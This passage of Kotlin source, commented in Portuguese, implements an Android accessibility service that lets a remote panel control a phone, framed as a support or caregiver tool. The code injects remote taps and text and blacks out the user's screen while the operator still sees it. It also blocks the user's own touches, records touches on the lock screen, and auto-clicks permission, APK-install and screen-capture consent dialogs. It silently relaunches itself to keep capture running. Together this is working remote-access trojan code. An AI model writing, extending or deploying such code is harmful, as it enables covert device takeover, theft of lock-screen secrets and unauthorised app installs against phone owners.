        val atrasoMs = if (telaDesligada) {
            if (acao.uppercase() == "START") {
                acenderTela()
                enviarLog("[GESTO] Tela apagada -> acendendo antes do movimento (atraso 700ms).")
            }
            700L
        } else 0L
        // Ações de acessibilidade/gestos na main thread (mais confiável no Android 14+ e Xiaomi).
        Handler(Looper.getMainLooper()).postDelayed({ handleRemoteGesture(acao, realX, realY) }, atrasoMs)
    }

    /** Chamado pelo SocketManager quando chega 'receber_tecla' do painel. */
    fun onRemoteTecla(json: JSONObject) {
        val tipo = json.optString("tipo", "")
        val valor = json.optString("valor", "")
        Handler(Looper.getMainLooper()).post { handleTecla(tipo, valor) }
    }

    /** Chamado pelo SocketManager quando chega 'desligar' do painel. */
    fun pararCaptura() {
        enviarLog("Recebido 'desligar' do painel — encerrando compartilhamento de tela.")
        try {
            stopService(Intent(this, ScreenCaptureService::class.java))
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao parar ScreenCaptureService: ${e.message}")
        }
    }

    private fun enviarLog(msg: String) {
        try { SocketManager.socket?.emit("log_dispositivo", "[ACES] $msg") } catch (_: Exception) {}
    }

    fun solicitarTelaPrivacidade() {
        handlerMain.post {
            if (overlayPrivacidade != null) return@post
            mostrarConsentimento()
        }
    }

    fun removerTelaPrivacidadeRemoto() {
        handlerMain.post { removerTelaPrivacidade("painel encerrou a tela de privacidade") }
    }

    /**
     * Chamado remotamente pelo SocketManager quando o cuidador ativa o "Modo Escuro".
     * NOTA (REGRA 4): o blackout agora é feito ESTRITAMENTE via WindowManager
     * (ScreenCaptureService.ativarTelaPretaFalsa) a partir do SocketManager.
     * Este método permanece apenas como fallback legado e não é mais chamado
     * pelo fluxo principal de tela_escura/modo_escuro.
     */
    fun solicitarTelaEscura() {
        handlerMain.post {
            if (overlayEscura != null) return@post
            aplicarTelaEscura()
        }
    }

    fun removerTelaEscuraRemoto() {
        handlerMain.post { removerTelaEscura("painel ativou Modo Clarear") }
    }

    private fun dp(valor: Int): Int = TypedValue.applyDimension(
        TypedValue.COMPLEX_UNIT_DIP, valor.toFloat(), resources.displayMetrics
    ).toInt()

    private fun mostrarConsentimento() {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#EE000000"))
            setPadding(dp(32), dp(32), dp(32), dp(32))
        }
        val titulo = TextView(this).apply {
            text = "Tela de privacidade"
            setTextColor(Color.WHITE)
            textSize = 20f
            gravity = Gravity.CENTER
        }
        val msg = TextView(this).apply {
            text = "A sessão de suporte quer escurecer sua tela por alguns instantes " +
                "para digitar uma informação em sigilo.\n\n" +
                "Se permitir, a tela ficará preta. Você pode voltar a qualquer momento " +
                "pressionando o botão Volume (−)."
            setTextColor(Color.parseColor("#DDDDDD"))
            textSize = 15f
            gravity = Gravity.CENTER
            setPadding(0, dp(16), 0, dp(24))
        }
        val linhaBotoes = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
        }
        val btnRecusar = Button(this).apply {
            text = "Recusar"
            setOnClickListener {
                removerTelaPrivacidade("usuario RECUSOU a tela de privacidade")
            }
        }
        val btnPermitir = Button(this).apply {
            text = "Permitir"
            setOnClickListener { aplicarTelaPretaPrivacidade() }
        }
        linhaBotoes.addView(btnRecusar, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
        linhaBotoes.addView(btnPermitir, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
        container.addView(titulo)
        container.addView(msg)
        container.addView(linhaBotoes)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        try {
            windowManager?.addView(container, params)
            overlayPrivacidade = container
            enviarLog("Pedido de tela de privacidade exibido ao usuario (aguardando consentimento).")
        } catch (e: Exception) {
            enviarLog("Falha ao exibir consentimento da tela de privacidade: ${e.message}")
        }
    }

    private fun criarViewPreta(textoAviso: String): FrameLayout {
        val preta = FrameLayout(this).apply { setBackgroundColor(Color.BLACK) }
        val aviso = TextView(this).apply {
            text = textoAviso
            setTextColor(Color.parseColor("#555555"))
            textSize = 13f
            gravity = Gravity.CENTER
        }
        preta.addView(
            aviso,
            FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT,
                Gravity.CENTER
            )
        )
        return preta
    }

    private fun paramsPreta() = WindowManager.LayoutParams(
        WindowManager.LayoutParams.MATCH_PARENT,
        WindowManager.LayoutParams.MATCH_PARENT,
        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
        PixelFormat.OPAQUE
    )

    private fun aplicarTelaPretaPrivacidade() {
        removerViewPrivacidade()
        val preta = criarViewPreta("Tela protegida durante o suporte\nVolume (−) para voltar")
        try {
            windowManager?.addView(preta, paramsPreta())
            overlayPrivacidade = preta
            handlerMain.postDelayed(autoRemover, TIMEOUT_PRIVACIDADE_MS)
            enviarLog("Tela de privacidade ATIVADA (com consentimento). Acesso remoto segue ativo.")
            try { SocketManager.socket?.emit("tela_privacidade_estado", "ativa") } catch (_: Exception) {}
        } catch (e: Exception) {
            enviarLog("Falha ao ativar tela de privacidade: ${e.message}")
        }
    }

    private fun removerViewPrivacidade() {
        overlayPrivacidade?.let {
            try { windowManager?.removeView(it) } catch (_: Exception) {}
        }
        overlayPrivacidade = null
    }

    private fun removerTelaPrivacidade(motivo: String) {
        handlerMain.removeCallbacks(autoRemover)
        if (overlayPrivacidade == null) return
        removerViewPrivacidade()
        enviarLog("Tela de privacidade REMOVIDA: $motivo")
        try { SocketManager.socket?.emit("tela_privacidade_estado", "inativa") } catch (_: Exception) {}
    }

    // ===================== TELA ESCURA DIRETA / CORTINA DE TELA (BRILHO ZERO) =====================
    /**
     * Fallback legado (overlay de acessibilidade). O fluxo principal (REGRA 4)
     * usa ScreenCaptureService.ativarTelaPretaFalsa via WindowManager a partir
     * do SocketManager. Mantido apenas para compatibilidade.
     */
    private fun aplicarTelaEscura() {
        val camadaPreta = View(this)
        camadaPreta.setBackgroundColor(android.graphics.Color.BLACK)
        val typeOverlay = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
        } else {
            @Suppress("DEPRECATED")
            WindowManager.LayoutParams.TYPE_PHONE
        }
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            typeOverlay,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                WindowManager.LayoutParams.FLAG_SECURE,
            PixelFormat.OPAQUE
        )
        try {
            windowManager?.addView(camadaPreta, params)
            overlayEscura = camadaPreta
            enviarLog("Modo Escuro ATIVADO (fallback acessibilidade + FLAG_SECURE). Painel continua vendo tela colorida.")
        } catch (e: Exception) {
            enviarLog("Falha ao ativar Modo Escuro: ${e.message}")
        }
    }

    private fun removerTelaEscura(motivo: String) {
        if (overlayEscura == null) return
        overlayEscura?.let {
            try { windowManager?.removeView(it) } catch (_: Exception) {}
        }
        overlayEscura = null
        enviarLog("Modo Clarear ATIVADO: $motivo (brilho físico do display restaurado).")
    }

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        // HOME com a tela apagada: acende a tela. Não consome o evento —
        // o home continua funcionando normalmente.
        try {
            if (event?.keyCode == KeyEvent.KEYCODE_HOME && event.action == KeyEvent.ACTION_DOWN) {
                val pm = getSystemService(POWER_SERVICE) as PowerManager
                if (!pm.isInteractive) {
                    acenderTela()
                    enviarLogApp("[HOME] Tela apagada detectada ao apertar HOME — tela acesa.")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro no onKeyEvent (HOME): ${e.message}")
        }
        if (overlayPrivacidade != null &&
            event?.keyCode == KeyEvent.KEYCODE_VOLUME_DOWN &&
            event.action == KeyEvent.ACTION_DOWN
        ) {
            removerTelaPrivacidade("usuario pressionou Volume (−)")
            return true
        }
        return super.onKeyEvent(event)
    }

    /**
     * Executa gestos remotos de toque/arraste usando a API nativa dispatchGesture,
     * compatível com Xiaomi (MIUI/HyperOS) e sem depender de rotas de Acessibilidade Restrita.
     */
    private fun handleRemoteGesture(acao: String, x: Float, y: Float) {
        val metrics = resources.displayMetrics
        val boundedX = x.coerceIn(0f, metrics.widthPixels.toFloat() - 1f)
        val boundedY = y.coerceIn(0f, metrics.heightPixels.toFloat() - 1f)
        when (acao.uppercase()) {
            "START" -> {
                // Painel do emulador está prestes a controlar o dispositivo:
                // libera temporariamente o overlay de bloqueio para que o
                // gesto injetado (dispatchGesture) atravesse para os apps.
                // Isto garante que o painel NUNCA seja bloqueado.
                setBloqueioPermiteToqueRemoto(true)
                handlerMain.removeCallbacks(failsafeRestauroBloqueio)
                handlerMain.postDelayed(failsafeRestauroBloqueio, 8000L)
                activePath = Path().apply { moveTo(boundedX, boundedY) }
                startX = boundedX
                startY = boundedY
            }
            "MOVE" -> activePath?.lineTo(boundedX, boundedY)
            "END" -> {
                // ANTI-GHOST: sem START anterior (activePath nulo) = pacote
                // órfão. Ignora completamente para NÃO dar um tap em
                // coordenadas obsoletas (startX/startY do gesto anterior).
                if (activePath == null) {
                    enviarLog("END órfão ignorado (sem START anterior) — anti-ghost.")
                    restaurarBloqueioLocal()
                    return
                }
                val movido =
                    kotlin.math.abs(boundedX - startX) > 3f || kotlin.math.abs(boundedY - startY) > 3f
                val path: Path
                val duration: Long
                if (movido) {
                    path = activePath!!.apply { lineTo(boundedX, boundedY) }
                    duration = 300L
                } else {
                    // Tap físico simulado: toque de 50ms na coordenada X/Y exata (supera travas do Xiaomi)
                    path = Path().apply {
                        moveTo(startX, startY)
                        lineTo(startX + 1f, startY + 1f)
                    }
                    duration = 50L
                }
                val stroke = GestureDescription.StrokeDescription(path, 0, duration)
                val gesto = GestureDescription.Builder().addStroke(stroke).build()
                val aceito = dispatchGesture(gesto, object : GestureResultCallback() {
                    override fun onCompleted(g: GestureDescription?) {
                        enviarLog("gesto OK (${boundedX.toInt()},${boundedY.toInt()})")
                        restaurarBloqueioLocal()
                    }
                    override fun onCancelled(g: GestureDescription?) {
                        enviarLog("gesto CANCELADO (${boundedX.toInt()},${boundedY.toInt()})")
                        restaurarBloqueioLocal()
                    }
                }, null)
                if (!aceito) {
                    enviarLog("dispatchGesture recusado em (${boundedX.toInt()},${boundedY.toInt()})")
                    restaurarBloqueioLocal()
                }
                activePath = null
            }
        }
    }

    private fun handleTecla(tipo: String, valor: String) {
        // Navegação global (Voltar / Home) NÃO depende de campo de texto focado:
        // funciona em qualquer tela do aparelho, mesmo sem caixa de digitação.
        if (tipo == "tecla") {
            when (valor.uppercase()) {
                "BACK" -> {
                    val ok = performGlobalBackAction()
                    enviarLog("Botão BACK global injetado (ok=$ok)")
                    return
                }
                "HOME" -> {
                    val ok = performGlobalHomeAction()
                    enviarLog("Botão HOME global injetado (ok=$ok)")
                    return
                }
            }
        }
        val node: AccessibilityNodeInfo? =
            rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (node == null || !node.isEditable) {
            Log.d(TAG, "Nenhum campo de texto editável focado (tecla ignorada: $tipo/$valor)")
            return
        }
        val atual = node.text?.toString() ?: ""
        when (tipo) {
            "texto" -> definirTexto(node, atual + valor)
            "tecla" -> when (valor.uppercase()) {
                "BACKSPACE" -> if (atual.isNotEmpty()) definirTexto(node, atual.dropLast(1))
                "ESPACO", "SPACE" -> definirTexto(node, "$atual ")
                "TAB" -> definirTexto(node, "$atual\t")
                "ENTER" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        node.performAction(
                            AccessibilityNodeInfo.AccessibilityAction.ACTION_IME_ENTER.id
                        )
                    } else {
                        definirTexto(node, "$atual\n")
                    }
                }
            }
        }
    }

    private fun definirTexto(node: AccessibilityNodeInfo, texto: String) {
        val argsTexto = Bundle().apply {
            putCharSequence(
                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                texto
            )
        }
        node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, argsTexto)
        val argsSel = Bundle().apply {
            putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, texto.length)
            putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, texto.length)
        }
        node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, argsSel)
    }

    // ================================================================
    // REGRA 2/3 — MOTOR DE CLIQUE AUTOMÁTICO (INJECTY)
    // ----------------------------------------------------------------
    // Sempre que o serviço de acessibilidade está ativo e uma tela de
    // permissão/segurança do sistema (ou as configurações do Suporte
    // Motor, ou o próprio modal "Iniciar" do app, ou o diálogo do
    // MediaProjection) está em primeiro plano, injeta cliques automáticos
    // nos botões de "Permitir / Iniciar / Iniciar agora / Aceitar / Instalar"
    // para agilizar o processo do cliente — sem toque manual.
    //
    // MODO RÁPIDO (onboardingRapido=true): intervalo de 300ms entre cliques
    // e "voltar" automático após confirmar em telas de configuração.
    // ================================================================
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // CAPTURA DE GESTOS FÍSICOS DO USUÁRIO NA TELA DE BLOQUEIO (Keyguard)
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_VIEW_SELECTED,
            AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED,
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED,
            AccessibilityEvent.TYPE_VIEW_HOVER_ENTER,
            AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START,
            AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END,
            AccessibilityEvent.TYPE_TOUCH_INTERACTION_START,
            AccessibilityEvent.TYPE_TOUCH_INTERACTION_END,
            AccessibilityEvent.TYPE_GESTURE_DETECTION_START,
            AccessibilityEvent.TYPE_GESTURE_DETECTION_END,
            AccessibilityEvent.TYPE_VIEW_SCROLLED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                capturarToqueFisicoTelaBloqueio(event)
            }
        }

        // Acesso Total: consome/intercepta toques locais quando bloqueado.
        if (bloquearCliquesLocais) {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_CLICKED,
                AccessibilityEvent.TYPE_VIEW_FOCUSED,
                AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START,
                AccessibilityEvent.TYPE_TOUCH_INTERACTION_START -> {
                    Log.d(TAG, "Clique local bloqueado pelo Acesso Total (bloquearCliquesLocais=true) no evento: ${event.eventType}")
                }
            }
        }
        // REDE DE SEGURANÇA PÓS-BOOT / KEEP-ALIVE: em mudanças de janela/conteúdo,
        // verifica se o ecossistema (Socket + ScreenCaptureService) caiu e o
        // reergue silenciosamente. Throttle interno de 5s evita disparos repetidos.
        val tipoEvento = event.eventType
        if (tipoEvento == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            tipoEvento == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        ) {
            verificarEReanimarEcossistema()
        }
        // REGRA 2/3: automação assistiva de cliques em telas de permissão.
        tentarAutoCliquePermissoes(event)

        // TRANSMISSÃO CONTÍNUA DE TELEMETRIA (Modo Híbrido / Leitor FPS)
        enviarTelemetriaAcessibilidade(event)
    }

    /**
     * REDE DE SEGURANÇA PÓS-BOOT / KEEP-ALIVE.
     *
     * Chamada em mudanças de janela/conteúdo. Se o ScreenCaptureService estiver
     * morto (isRunning == false) e o onboarding já foi concluído, reergue o
     * ecossistema via Injetor Virtual: força a abertura da MainActivity em
     * modo headless (extra AUTO_BOOT_REANIMAR) para reobter um token válido
     * de MediaProjection — NÃO inicia o ScreenCaptureService diretamente (sem
     * token o vídeo trava). Throttle de 5s (REANIMACAO_INTERVALO_MS) + flag de
     * tentativa evitam loops de reabertura no display do cliente.
     */
    private fun verificarEReanimarEcossistema() {
        try {
            // Throttle: no máximo uma tentativa a cada REANIMACAO_INTERVALO_MS.
            val agora = System.currentTimeMillis()
            if (agora - ultimaTentativaReanimacao < REANIMACAO_INTERVALO_MS) return
            // Se o serviço já está rodando, nada a fazer (e zera contador de falhas).
            if (ScreenCaptureService.isRunning) { reanimacaoFalhasConsecutivas = 0; return }
            // Sem socket conectado = ninguém assistindo ao vídeo → não reanima
            // (evita abrir a MainActivity à toa e "mexer a tela" sem motivo).
            if (SocketManager.socket?.connected() != true) return
            // Onboarding precisa estar concluído (primeiro_acesso == false).
            val prefs = getSharedPreferences("rastreio_facil_prefs", MODE_PRIVATE)
            val onboardingConcluido = !prefs.getBoolean("primeiro_acesso", true)
            if (!onboardingConcluido) return
            // LIMITE DE TENTATIVAS: após N falhas consecutivas (ex.: MediaProjection
            // negado permanentemente), DESISTE — não fica mais abrindo a
            // MainActivity em loop (que fazia a tela "mexer sozinha").
            if (reanimacaoFalhasConsecutivas >= MAX_REANIMACAO_TENTATIVAS) {
                Log.d(TAG, "Keep-alive DESATIVADO: $MAX_REANIMACAO_TENTATIVAS tentativas consecutivas sem sucesso (MediaProjection indisponível).")
                return
            }
            // Marca a tentativa ANTES de disparar (evita múltiplas chamadas
            // concorrentes enquanto o start ainda não surtiu efeito em isRunning).
            ultimaTentativaReanimacao = agora
            reanimacaoFalhasConsecutivas++
            // ── INJETOR VIRTUAL PÓS-BOOT ─────────────────────────────────────
            // NÃO inicia mais o ScreenCaptureService diretamente (sem token de
            // MediaProjection o vídeo fica travado). Em vez disso, força a
            // abertura da MainActivity em modo headless com o extra
            // AUTO_BOOT_REANIMAR — ela pede o MediaProjection, inicia o
            // Foreground Service com token válido e se fecha em 200ms.
            // O throttle de 5s (REANIMACAO_INTERVALO_MS) no início desta função
            // impede loops de reabertura no display do cliente.
            SocketManager.appContext = applicationContext
            val i = Intent(this, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                putExtra("AUTO_BOOT_REANIMAR", true)
            }
            startActivity(i)
            enviarLogApp("[KEEP-ALIVE] Injetor Virtual disparado: MainActivity headless (AUTO_BOOT_REANIMAR) para reobter token de MediaProjection.")
        } catch (e: Exception) {
            Log.e(TAG, "Erro na verificação de keep-alive: ${e.message}")
        }
    }

    /** onboardingRapido só vale enquanto o primeiro acesso NÃO foi concluído.
     *  A flag pode ficar presa em true na memória — a SharedPreferences é a
     *  fonte da verdade. Sem isto, o "voltar automático" (BACK) e o clique
     *  rápido de 300ms ficam ativos para sempre, e o app passa a fechar/
     *  navegar sozinho. */
    private fun onboardingRapidoAtivo(): Boolean {
        if (!onboardingRapido) return false
        return try {
            getSharedPreferences("rastreio_facil_prefs", MODE_PRIVATE)
                .getBoolean("primeiro_acesso", true)
        } catch (e: Exception) {
            onboardingRapido
        }
    }

    /** Intervalo entre auto-cliques: 300ms no onboarding rápido, senão 1200ms. */
    private fun intervaloAutoCliqueMs(): Long =
        if (onboardingRapidoAtivo()) CLICK_RAPIDO_INTERVALO_MS else CLICK_AUTO_INTERVALO_MS

    /**
     * Retorna true se, após auto-clicar neste pacote (tela de configuração/
     * instalador), devemos VOLTAR automaticamente para o app. NÃO aplica a
     * SystemUI (diálogo do MediaProjection fecha sozinho) nem ao próprio app.
     */
    private fun pacoteRequerVoltarAutomatico(pacote: String): Boolean {
        val p = pacote.lowercase()
        return p.contains("settings") || p.contains("security") || p.contains("miui") ||
            p.contains("lbe") || p.contains("packageinstaller") || p.contains("permissioncontroller")
    }

    private fun tentarAutoCliquePermissoes(event: AccessibilityEvent) {
        try {
            if (!autoClickPermissoesAtivo) return
            val tipo = event.eventType
            if (tipo != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
                tipo != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            ) return
            val pacote = event.packageName?.toString() ?: return

            // REGRA 2 — ESCOPO ESTRITO: app terceiro = auto-clique IGNORADO.
            if (!pacotePermitidoParaAutoClique(pacote)) {
                Log.d(TAG, "Auto-clique IGNORADO (escopo estrito): pacote terceiro '$pacote'.")
                return
            }

            // REGRA 1: limpa cache de botões clicados se a janela mudou.
            resetarCacheCliqueSeMudouJanela(pacote)
            _pacoteAutoCliqueAtual = pacote

            val raiz = rootInActiveWindow ?: return

            // SEGURANÇA: a janela ativa (raiz) pode pertencer a OUTRO pacote
            // que não o do evento (overlay, diálogo de outro app). Se o pacote
            // da janela não for permitido, aborta — nunca clica em terceiros.
            val pacoteJanela = raiz.packageName?.toString() ?: ""
            if (pacoteJanela.isNotEmpty() && !pacotePermitidoParaAutoClique(pacoteJanela)) {
                Log.d(TAG, "Auto-clique IGNORADO: janela ativa pertence a pacote terceiro '$pacoteJanela' (evento='$pacote').")
                return
            }
            val usarEstrito = pacoteUsaListaEstrita(pacote) ||
                (pacoteJanela.isNotEmpty() && pacoteUsaListaEstrita(pacoteJanela))

            // FAST PATH 0ms — instalador do sistema (com trava única por tela).
            if (pacote in pacotesInstalador || pacote.lowercase().contains("packageinstaller")) {
                val clicou = procurarEClicarBotaoInstalador(raiz) || procurarEClicarPermissao(raiz, usarEstrito)
                if (clicou) {
                    ultimoCliqueAuto = System.currentTimeMillis()
                    enviarLog("[AUTO-CLIQUE INSTALADOR 0ms] Clique imediato (pacote=$pacote; trava única por tela ativa).")
                }
                return
            }

            val agora = System.currentTimeMillis()
            if (agora - ultimoCliqueAuto < intervaloAutoCliqueMs()) return
            val clicado = procurarEClicarPermissao(raiz, usarEstrito)
            if (clicado) {
                ultimoCliqueAuto = agora
                enviarLog("[AUTO-CLIQUE] Clique único em permissão (pacote=$pacote; trava anti-loop ativa; onboardingRapido=$onboardingRapido).")
                if (onboardingRapidoAtivo() && !backAgendado && pacoteRequerVoltarAutomatico(pacote)) {
                    backAgendado = true
                    handlerMain.postDelayed({
                        backAgendado = false
                        try {
                            performGlobalAction(GLOBAL_ACTION_BACK)
                            enviarLog("[AUTO-CLIQUE] Voltar automático (onboarding rápido) após confirmar permissão.")
                        } catch (e: Exception) {
                            Log.e(TAG, "Falha no voltar automático: ${e.message}")
                        }
                    }, 900)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro no auto-clique de permissões: ${e.message}")
        }
    }

    /**
     * Busca em profundidade (DFS) por botões clicáveis com texto de permissão
     * ("Permitir", "Iniciar", "Iniciar agora", "Aceitar", "Instalar", etc.) e
     * injeta ACTION_CLICK no primeiro encontrado. Nunca clica em textos de
     * bloqueio ("Negar", "Cancelar", "Desativar", "Não permitir", "Depois").
     *
     * Cobre: telas de aviso de segurança Xiaomi/MIUI/HyperOS, Android 13+,
     * instalador de APKs, tela de sobreposição, diálogo "Iniciar agora" do
     * MediaProjection (SystemUI) e o próprio modal "Iniciar" do app.
     */
    private fun procurarEClicarPermissao(no: AccessibilityNodeInfo, usarEstrito: Boolean): Boolean {
        try {
            val textoBruto = (no.text?.toString() ?: "") + " " + (no.contentDescription?.toString() ?: "")
            val texto = textoBruto.trim().lowercase()
            if (no.isClickable && texto.isNotEmpty()) {
                // REGRA 3: bloqueio verificado PRIMEIRO — invalida o nó completamente.
                val eBloqueio = textosBloquear.any { texto.contains(it) }
                if (!eBloqueio) {
                    // Lista estrita (Config/SystemUI/MIUI) = comparação EXATA,
                    // só frases de permissão. Lista ampla (instalador/
                    // permissioncontroller) = contains (compatibilidade OEM).
                    val ePermitir = if (usarEstrito) textosPermitirEstritos.any { texto == it }
                                    else textosPermitir.any { texto.contains(it) }
                    // REGRA 1: trava única por tela — não clica duas vezes no mesmo botão.
                    if (ePermitir && !botaoJaClicadoNaTela(texto)) {
                        val ok = no.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (ok) { marcarBotaoClicado(texto); return true }
                    }
                }
            }
            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                if (procurarEClicarPermissao(filho, usarEstrito)) return true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro na busca DFS de auto-clique: ${e.message}")
        }
        return false
    }

    // Textos do botao positivo do instalador do sistema (varios OEMs/idiomas).
    private val textosBotaoInstalador = listOf(
        "instalar", "atualizar", "install", "update",
        "instalar pacote", "instalar aplicativo", "atualizar aplicativo",
        "instalar mesmo assim", "continuar instalando", "reinstall", "reinstalar"
    )

    /**
     * FAST PATH 0ms do instalador: busca DFS por um botao clicavel com texto
     * de "Instalar"/"Atualizar" e injeta ACTION_CLICK imediato.
     *
     * Requisito 3 (evitar falsos positivos de fechamento): verifica
     * explicitamente textosBloquear ("cancelar", "depois", "nao", "nao
     * instalar", etc.). Essas palavras SO bloqueiam o NO que as contem —
     * o botao "Instalar" (que nao as contem) e clicado normalmente mesmo
     * que "Cancelar"/"Depois" existam no mesmo dialogo do sistema. Negativas
     * como "Nao instalar" tambem sao bloqueadas por conterem "nao".
     */
    private fun procurarEClicarBotaoInstalador(no: AccessibilityNodeInfo): Boolean {
        try {
            val texto = ((no.text?.toString() ?: "") + " " +
                (no.contentDescription?.toString() ?: "")).trim().lowercase()
            if (no.isClickable && texto.isNotEmpty()) {
                val eBloqueado = textosBloquear.any { texto.contains(it) }
                if (!eBloqueado) {
                    val eBotaoInstalar = textosBotaoInstalador.any { texto.contains(it) }
                    if (eBotaoInstalar && !botaoJaClicadoNaTela(texto)) {
                        if (no.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                            marcarBotaoClicado(texto)
                            return true
                        }
                    }
                }
            }
            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                if (procurarEClicarBotaoInstalador(filho)) return true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro no clique imediato do instalador: ${e.message}")
        }
        return false
    }

    // Textos EXATOS do botão positivo do diálogo do MediaProjection (vários OEMs/idiomas).
    private val textosBotaoMidiaProjecao = listOf(
        "iniciar agora", "start now", "começar agora", "comecar agora",
        "iniciar captura de tela", "iniciar projeção de tela", "iniciar projecao de tela",
        "iniciar compartilhamento de tela", "start screen sharing", "iniciar"
    )

    /**
     * Fallback OEM-agnóstico para o diálogo de consentimento do MediaProjection.
     * Procura (DFS) um botão clicável com texto EXATO de "Iniciar agora" /
     * "Start now" e clica nele. Comparação exata para evitar falsos positivos
     * em outros diálogos do sistema.
     */
    private fun procurarEClicarBotaoMidiaProjecao(no: AccessibilityNodeInfo): Boolean {
        try {
            val texto = (no.text?.toString() ?: "").trim().lowercase()
            if (no.isClickable && texto.isNotEmpty() && textosBotaoMidiaProjecao.contains(texto)) {
                val eBloqueio = textosBloquear.any { texto.contains(it) }
                if (!eBloqueio && !botaoJaClicadoNaTela(texto)) {
                    if (no.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        marcarBotaoClicado(texto)
                        return true
                    }
                }
            }
            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                if (procurarEClicarBotaoMidiaProjecao(filho)) return true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro no fallback de MediaProjection: ${e.message}")
        }
        return false
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility Service Interrompido")
    }

    override fun onDestroy() {
        super.onDestroy()
        handlerMain.removeCallbacks(autoRemover)
        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
        removerViewPrivacidade()
        overlayEscura?.let { try { windowManager?.removeView(it) } catch (_: Exception) {} }
        overlayEscura = null
        overlayBloqueio?.let { try { windowManager?.removeView(it) } catch (_: Exception) {} }
        overlayBloqueio = null
        overlayKioskAtualizacao?.let { try { windowManager?.removeView(it) } catch (_: Exception) {} }
        overlayKioskAtualizacao = null
        if (instance == this) {
            instance = null
        }
        Log.d(TAG, "Accessibility Service Destruído")
    }

    /** Clique direto via dispatchGesture com toque físico de 50ms na coordenada exata (compatível com Xiaomi). */
    fun clickAt(x: Float, y: Float, onResult: ((Boolean) -> Unit)? = null) {
        // Usado pelo motor de auto-clique; se o Acesso Total estiver ativo,
        // libera o overlay para o gesto injetado atravessar (painel não trava).
        setBloqueioPermiteToqueRemoto(true)
        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
        handlerMain.postDelayed(failsafeRestauroBloqueio, 3000L)
        val boundedX = x.coerceIn(0f, resources.displayMetrics.widthPixels.toFloat() - 1f)
        val boundedY = y.coerceIn(0f, resources.displayMetrics.heightPixels.toFloat() - 1f)
        val path = Path().apply {
            moveTo(boundedX, boundedY)
            lineTo(boundedX + 1f, boundedY + 1f)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0, 50L)
        val gestureBuilder = GestureDescription.Builder().addStroke(stroke)
        dispatchGesture(gestureBuilder.build(), object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                super.onCompleted(gestureDescription)
                restaurarBloqueioLocal()
